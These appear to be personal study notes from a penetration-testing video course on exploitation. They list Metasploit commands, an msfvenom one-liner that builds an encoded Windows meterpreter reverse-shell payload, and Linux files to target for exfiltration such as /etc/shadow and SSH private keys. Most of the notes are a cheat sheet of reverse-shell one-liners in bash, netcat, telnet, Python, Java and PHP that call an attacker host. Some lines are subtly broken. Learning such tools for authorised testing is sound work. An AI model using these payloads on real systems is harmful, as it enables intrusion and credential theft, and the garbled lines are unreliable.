---
title: '4. Fourth Video: Exploitation'
updated: 2023-04-23 04:14:00Z
created: 2023-04-22 20:55:19Z
---
# **Exploitation**

## **Metasploit**

- **Start msfconsole**
	- msfconsole
- **To show all exploits that for a vulnerability**
	- grep <vulnerability> show exploits
- **To select an exploit to use**
	- use <exploit>
- **To see the current settings for a selected exploit**
	- show options
- **To see compatible payloads for a selected exploit**
	- show payloads
- **To set the payload for a selected exploit**
	- set payload <payload>
- **To set setting for a selected exploit** 
	- set <option> <value>
- **To run the exploit**
	- exploit
- **One liner to create/generate a payload for windows**
	- msfvenom --arch x86 --platform windows --payload windows/meterpreter/reverse_tcp LHOST=<listening_host> LPORT=<listening_port> --bad-chars “\x00” --encoder x86/shikata_ga_nai --iterations 10 --format exe --out /path/
- **One liner start meterpreter**
	- msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"

## **Linux Exfiltration Target Files:**
- /etc/passwd
- /etc/shadow
- /etc/issue
- /etc/group
- /etc/hostname
- /etc/ssh/ssh_config
- /etc/ssh/sshd_config
- /root/.ssh/id_rsa
- /root/.ssh/authorized_keys
- /home/user/.ssh/authorized_keys
- /home/user/.ssh/id_rsa
 ##

# **Command Execution Vulnerability Exploiting: Reverse Shells**
## **Bash**  
Alternatives for **Bash** shell:  

> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Or:

> exec /bin/bash 0&0 2>&0

Or:  

> 0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

Or:  

> exec 5<>/dev/tcp/attackerip/4444  
> cat <&5 | while read line; do $line 2>&5 >&5; done  # or:  
> while read line 0<&5; do $line 2>&5 >&5; done

## **Netcat**  
  
Others possible **Netcat** reverse shells, depending on the Netcat version and compilation flags:

> nc -c /bin/sh attackerip 4444

Or:

> /bin/sh | nc attackerip 4444

Or:

> rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p

## **Telnet**  
  
You can also use **Telnet** as an alternative for Netcat:

> rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p

Or:  

> telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp

## **Python** 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s. onnect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
## **Java**
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
## **PHP**
	- php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
